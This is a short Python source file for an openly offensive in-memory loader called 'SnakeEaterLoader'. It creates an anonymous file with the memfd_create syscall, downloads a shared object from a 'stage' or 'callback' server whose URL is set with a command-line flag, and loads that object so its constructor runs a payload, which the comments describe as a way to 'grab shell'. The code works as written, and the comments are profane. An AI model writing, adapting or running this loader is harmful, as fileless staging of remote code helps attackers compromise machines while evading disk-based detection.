# where the fuck are the stygian
# pony references? seriously bro?
try:
    import ctypes
    import os
    import urllib.request as getter
    import hashlib
    import pdb
    import argparse
except:
    print("somehow you are missing some standard python libraries, sorry :(")
    exit(1)

MEMFD_CREATE_NO = 319   # stupid fucking syscall is next
                        # to completly undocumented

class SnakeEaterLoader:
    def __init__(self):
        # modify 
        self.url = "http://127.0.0.1:8080/module1.so"
        # just to force it to int (lazy)
        self.fd = 0
    
    def get_memfd(self):
        # python one liners are so pretty ain't they?

        # use ctypes to get our anon page and corosponding fd
        self.fd = ctypes.CDLL(None).syscall(MEMFD_CREATE_NO,"/tmp/none",1)
    
    def write_so(self):
        # open connection to stage server
        resp = getter.urlopen(self.url)
        if resp.status != 200: # verify
            print("could not contact callback server")
            exit(1)
        # get remote so
        # hosting encrypted and decrypting
        # here would be pretty easy, but W/E
        data = resp.read()
        # write the so to our memfd created
        # page
        os.write(self.fd,data)


    def open_so(self):
        # here be magic
        path = "/proc/self/fd/" + str(self.fd)
        ctypes.CDLL(path) #.dlopen(path,1) <-- doesn't fuckin work

def main():
    # create object

    conf = argparse.ArgumentParser(description="In memory so injector")
    conf.add_argument(
            '--url', 
            help="url of the SO file",
            type=str
        )
    conf = conf.parse_args()

    loader = SnakeEaterLoader()
    if conf.url:
        loader.url = conf.url
    # get memfd_create fd + page
    loader.get_memfd()
    # use urllib to write to the anon page
    loader.write_so()
    # open with CDLL;
    # constructor executes upon load
    # which is what we take advantage
    # of to run our payload

    # so just load the dll and grab shell
    # (threading is possible and easy
    # but the thread would be killed 
    # on exit so if you are moding me
    # make sure it sleeps or something)
    loader.open_so()

# moduleify this shit!
if __name__=='__main__':
    main()

main()
